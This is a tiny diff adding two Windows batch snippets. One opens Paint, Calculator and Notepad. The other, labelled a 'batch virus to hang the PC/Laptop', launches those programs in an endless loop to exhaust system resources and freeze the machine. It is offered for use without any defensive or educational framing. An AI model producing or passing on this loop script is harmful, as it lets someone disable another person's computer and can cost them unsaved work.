@@ -1,0 +1,12 @@
+1. Normal program to start paint and calculator without clicking:
+@echo off
+start mspaint
+start calc
+start notepad
+2. Batch virus to hang the PC/Laptop:
+@echo off
+:x
+start mspaint
+start calc
+start notepad
+goto x
